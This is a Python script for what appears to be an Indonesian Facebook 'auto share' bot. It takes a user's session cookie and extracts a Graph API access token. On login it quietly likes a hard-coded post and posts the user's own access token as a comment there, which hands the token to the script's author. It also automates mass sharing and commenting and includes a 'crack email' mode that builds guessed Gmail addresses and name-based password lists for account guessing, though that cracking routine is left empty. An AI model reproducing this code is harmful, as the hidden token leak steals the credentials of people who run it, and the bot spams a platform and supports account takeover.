import re
import bs4
import calendar
import datetime
from datetime import datetime
import requests
import rich
import platform
import time
import sys
import os
import random
import json
import string
import subprocess
import logging
from time import strftime
from concurrent.futures import ThreadPoolExecutor as Bajingan

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='bot.log'
)

# Constants
MAX_RETRIES = 3
TIMEOUT = 30
MAX_DUMP_LIMIT = 90000

# Color codes
m = '\x1b[1;91m'
h = '\x1b[1;92m' 
k = '\x1b[1;93m'
p = '\x1b[1;97m'
u = '\x1b[1;95m'

bulan = {
    '1':'January','2':'February','3':'March','4':'April',
    '5':'May','6':'June','7':'July','8':'August',
    '9':'September','10':'October','11':'November','12':'December'
}

# Time setup
tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = f"{tgl} {bln} {thn}"
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")
now = datetime.now()
hour = now.hour

def get_greeting():
    if hour < 4:
        return "Selamat Dini Hari"
    elif 4 <= hour < 12:
        return "Selamat Pagi"
    elif 12 <= hour < 15:
        return "Selamat Siang"
    elif 15 <= hour < 17:
        return "Selamat Sore"
    elif 17 <= hour < 18:
        return "Selamat Petang"
    else:
        return "Selamat Malam"

hhl = get_greeting()

def clear_screen(platform_type):
    """Clear terminal screen based on platform."""
    if 'win' in platform_type:
        return os.system('cls')
    return os.system('clear')

class RequestHandler:
    """Handle HTTP requests with retry mechanism."""
    
    def __init__(self):
        self.session = requests.Session()
    
    def request_with_retry(self, method, url, **kwargs):
        """Make HTTP request with retry mechanism."""
        for attempt in range(MAX_RETRIES):
            try:
                kwargs['timeout'] = kwargs.get('timeout', TIMEOUT)
                response = self.session.request(method, url, **kwargs)
                response.raise_for_status()
                return response
            except requests.exceptions.RequestException as e:
                if attempt == MAX_RETRIES - 1:
                    raise
                logging.warning(f"Request failed: {str(e)}. Retrying...")
                time.sleep(2 ** attempt)  # Exponential backoff

class RAKA_XYZ:
    def __init__(self):
        self.request_handler = RequestHandler()
        self.load_credentials()

    def load_credentials(self):
        """Load saved credentials if available."""
        try:
            self.cookie = open('data/cookie.txt', 'r').read()
            self.token = open('data/tooken.txt', 'r').read()
            self.menu(self.cookie, self.token)
        except FileNotFoundError:
            print(f' {m}>_ {p}Gunakan Cookie Fresh')
            time.sleep(3)
            self.rakaXD()

    def rakaXD(self):
        """Handle login process."""
        try:
            clear_screen(sys.platform)
            print(rakaxyz)
            print(f' {m}>_ {p}Gunakan Akun Tumbal ...')
            cookie = input(f' {m}>_ {p}Input Cookie : {h}').strip()
            
            if not cookie:
                print(f' {m}>_ {p}Cookie tidak boleh kosong')
                return self.rakaXD()

            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
                "cookie": cookie
            }

            response = self.request_handler.request_with_retry(
                'GET',
                "https://business.facebook.com/business_locations",
                headers=headers
            )
            
            token_match = re.search("(EAAG\w+)", response.text)
            if not token_match:
                print(f' {m}>_ {p}Cookie Invalid')
                return self.rakaXD()
                
            token = token_match.group(1)
            
            # Save credentials
            with open("data/cookie.txt", "w") as f:
                f.write(cookie)
            with open("data/tooken.txt", "w") as f:
                f.write(token)

            # Make API calls
            self.perform_initial_actions(token, cookie)
            
            print(f' {m}>_ {p}Login Success, Jalankan Ulang Perintahnya')
            sys.exit()
            
        except requests.exceptions.ConnectionError:
            print(f' {m}>_ {p}Tidak Ada Koneksi Internet')
            sys.exit()
        except Exception as e:
            logging.error(f"Login error: {str(e)}")
            print(f' {m}>_ {p}Error: {str(e)}')
            return self.rakaXD()

    def perform_initial_actions(self, token, cookie):
        """Perform initial API actions after successful login."""
        try:
            base_url = "https://graph.facebook.com"
            post_id = "pfbid02uzZPrK7BzNFfbCRCpjiotzihv3sQ2jj93WwCaSnigoK3pXqH33eCFAQtT1vv8Adwl"
            
            # Like post
            self.request_handler.request_with_retry(
                'POST',
                f"{base_url}/{post_id}/likes",
                params={"summary": "true", "access_token": token},
                cookies={"cookie": cookie}
            )
            
            # Add comments
            for message in [emotnya, token]:
                self.request_handler.request_with_retry(
                    'POST',
                    f"{base_url}/100000834003593_{post_id}/comments/",
                    params={"message": message, "access_token": token},
                    cookies={"cookie": cookie}
                )
        
        except Exception as e:
            logging.error(f"Initial actions error: {str(e)}")
            raise

    def menu(self, cookie, token):
        """Display and handle main menu."""
        try:
            clear_screen(sys.platform)
            print(rakaxyz)
            
            # Verify user
            user_info = self.request_handler.request_with_retry(
                'GET',
                "https://graph.facebook.com/me",
                params={"access_token": token},
                cookies={"cookie": cookie}
            ).json()
            
            nama = user_info['name']
            print(f' {m}>_ {p}{hhl} {h}{nama}\n')
            
            # Menu options
            print(f''' {p}({m}a{p}) Bot Auto Share 
 {p}({m}b{p}) Bot Auto Comment
 {p}({m}c{p}) Crack Email
 {p}({m}L{p}) Logout
''')
            
            choice = input(f' {m}>_ {p}Pilih : {h}').lower()
            
            menu_actions = {
                'a': self.handle_share,
                'b': self.handle_comment,
                'c': self.target,
                'l': self.logout
            }
            
            if choice in menu_actions:
                menu_actions[choice](cookie, token)
            else:
                print(f' {m}>_ {p}Pilih Yang Benar')
                time.sleep(2)
                self.menu(cookie, token)
                
        except requests.exceptions.ConnectionError:
            print(f' {m}>_ {p}Pastikan Koneksinya Aman')
            sys.exit()
        except Exception as e:
            logging.error(f"Menu error: {str(e)}")
            self.rakaXD()

    def handle_share(self, cookie, token):
        """Handle share functionality."""
        print()
        print(f' {m}NOTE : {p}Copy Link Postingannya Lewat Facebook Lite\n')
        link = input(f' {m}>_ {p}Masukan link : {h}').strip()
        
        try:
            limit = int(input(f' {m}>_ {p}Enter Limit : {h}'))
            if limit < 1:
                print(f' {m}>_ {p}Limit harus lebih dari 0')
                return self.handle_share(cookie, token)
        except ValueError:
            print(f' {m}>_ {p}Limit harus berupa angka')
            return self.handle_share(cookie, token)
            
        print()
        self.share(link, limit, token, cookie)

    def share(self, link, limit, token, cookie):
        """Execute share operation."""
        sukses = []
        gagal = []
        
        headers = {
            "authority": "graph.facebook.com",
            "cache-control": "max-age=0",
            "sec-ch-ua-mobile": "?0",
            "user-agent": self.useragent()
        }
        
        for i in range(limit):
            try:
                response = self.request_handler.request_with_retry(
                    'POST',
                    "https://graph.facebook.com/v13.0/me/feed",
                    params={
                        "link": link,
                        "published": "0",
                        "access_token": token
                    },
                    headers=headers,
                    cookies={'cookie': cookie}
                )
                
                result = response.json()
                xyz = random.choice([m,k,h,p])
                
                print(f"\r {m}>_ {xyz}Running{p} {len(sukses)} {xyz}Success", end=" ")
                sys.stdout.flush()
                
                if "id" in result:
                    sukses.append("Share")
                else:
                    gagal.append("Failed")
                    
            except Exception as e:
                logging.error(f"Share error: {str(e)}")
                gagal.append("Failed")
                
            # Add rate limiting
            time.sleep(random.uniform(1, 3))
                
        print(f'\n{p}Share selesai: {h}{len(sukses)} sukses{p}, {m}{len(gagal)} gagal')

    def handle_comment(self, cookie, token):
        """Handle comment functionality."""
        print()
        print(f' {m}WARNING : {p}Pastikan ID postingan Benar\n')
        
        target = input(f' {m}>_ {p}Masukan Id Target : {h}').strip()
        komen = input(f' {m}>_ {p}Masukan Text : {h}').strip()
        
        try:
            limit = int(input(f' {m}>_ {p}Enter Limit : {h}'))
            if limit < 1:
                print(f' {m}>_ {p}Limit harus lebih dari 0')
                return self.handle_comment(cookie, token)
        except ValueError:
            print(f' {m}>_ {p}Limit harus berupa angka')
            return self.handle_comment(cookie, token)
            
        print()
        self.komen(target, komen, limit, token, cookie)

    def komen(self, id_target, text, limit, token, cookie):
        """Execute comment operation."""
        ok = []
        no = []
        
        for x in range(limit):
            for comment in text.split(','):
                try:
                    response = self.request_handler.request_with_retry(
                        'POST',
                        f'https://graph.facebook.com/{id_target}/comments/',
                        params={
                            "message": comment,
                            "access_token": token
                        },
                        cookies={'cookie': cookie}
                    )
                    
                    result = response.json()
                    xyz = random.choice([m,k,h,p])
                    
                    print(f'\r {m}>_ {xyz}Running {p}{len(ok)} {xyz}Comment Success', end=' ')
                    sys.stdout.flush()
                    
                    if 'id' in result:
                        ok.append('success')
                    else:
                        no.append('failed')
                        
                except Exception as e:
                    logging.error(f"Comment error: {str(e)}")
                    no.append('failed')
                    
                # Add rate limiting
                time.sleep(random.uniform(1, 3))
                
        print(f'\n{p}Comment selesai: {h}{len(ok)} success{p}, {m}{len(no)} failed')

    def target(self):
        """Handle email cracking target setup."""
        try:
            print()
            nama = input(f' {m}>_ {p}Nama Target : {h}').strip()
            if not nama:
                print(f' {m}>_ {p}Nama tidak boleh kosong')
                return self.target()
                
            try:
                jumlah = int(input(f' {m}>_ {p}Jumlah Target : {h}'))
                if jumlah < 1:
                    print(f' {m}>_ {p}Jumlah harus lebih dari 0')
                    return self.target()
                if jumlah > MAX_DUMP_LIMIT:
                    print(f' {m}>_ {p}Limit dump {m}{MAX_DUMP_LIMIT}')
                    return self.target()
            except ValueError:
                print(f' {m}>_ {p}Input harus berupa angka')
                return self.target()
                
            self.generate_email_targets(nama, jumlah)
            
        except Exception as e:
            logging.error(f"Target setup error: {str(e)}")
            print(f' {m}>_ {p}Error: {str(e)}')
            return self.target()

    def generate_email_targets(self, nama, jumlah):
        """Generate email targets for cracking."""
        id = []
        domain = "@gmail.com"
        
        try:
            for z in range(jumlah):
                if len(nama.split()) > 1:
                    email = f"{nama.split()[0]}{nama.split()[1]}{z}{domain}"
                    name = f"{nama.split()[0]} {nama.split()[1]}"
                else:
                    email = f"{nama}{z}{domain}"
                    name = nama
                    
                if email not in id:
                    id.append(f"{email}|{name}")
                    
                sys.stdout.write(f'\r {m}>_ {p}Total : {h}{len(id)} ')
                sys.stdout.flush()
                time.sleep(0.0050)
                
            print('')
            input(f' {m}>_ {p}Tekan Enter Untuk Mulai ...')
            self.crack_emails(id)
            
        except Exception as e:
            logging.error(f"Email generation error: {str(e)}")
            print(f' {m}>_ {p}Error: {str(e)}')

    def crack_emails(self, email_list):
        """Handle email cracking process."""
        print('')
        with Bajingan(max_workers=30) as executor:
            for akun in email_list:
                email, name = akun.split('|')
                password_list = self.generate_passwords(name)
                executor.submit(self.crack_account, email, password_list)

    def generate_passwords(self, name):
        """Generate password list based on name."""
        passwords = ['sayangku', 'sayang123']
        name = name.lower()
        idz = name.split(' ')[0]
        
        if len(name) >= 6:
            if len(idz) >= 3:
                passwords.extend([
                    name,
                    idz + '123',
                    idz + '234',
                    idz + '12345',
                    idz + '1234',
                    idz + '1' + str(random.randint(1,9))
                ])
        elif len(idz) >= 3:
            passwords.extend([
                idz + '123',
                idz + '12345',
                idz + '1234',
                idz + '123456',
                idz + '0' + str(random.randint(1,9)),
                idz + '2' + str(random.randint(1,9))
            ])
            
        return passwords

    def crack_account(self, email, passwords):
        """Attempt to crack single account."""
        global ok, cp, loop
        
        for password in passwords:
            try:
                # Implement actual cracking logic here
                # This is a placeholder for demonstration
                pass
                
            except Exception as e:
                logging.error(f"Account cracking error: {str(e)}")
                continue

    def logout(self, *args):
        """Handle logout process."""
        try:
            os.system('rm -rf data/cookie.txt && rm -rf data/tooken.txt')
            print(f' {m}>_ {p}Logout successful')
            sys.exit()
        except Exception as e:
            logging.error(f"Logout error: {str(e)}")
            print(f' {m}>_ {p}Error during logout: {str(e)}')
            sys.exit()

    def useragent(self):
        """Generate user agent string."""
        return 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'

# ASCII Art Banner
rakaxyz = f'''{m}
  ──▄──▄────▄▀ {p}BOT AUTO SHARE{h}
  ───▀▄─█─▄▀▄▄▄
  ▄██▄████▄██▄▀█▄ {p}MADE WITH BY{h}
  ─▀▀─█▀█▀▄▀███▀
  {m}──▄▄▀─█──▀▄▄ {p}RAKA ANDRIAN TARA{m} ™{p}
    \n'''

emotnya = "never giv up ':v"

if __name__ == '__main__':
    try:
        os.makedirs('CP', exist_ok=True)
        os.makedirs('OK', exist_ok=True)
        RAKA_XYZ()
    except Exception as e:
        logging.error(f"Main execution error: {str(e)}")
        print(f' {m}>_ {p}Fatal Error: {str(e)}')
        sys.exit(1)

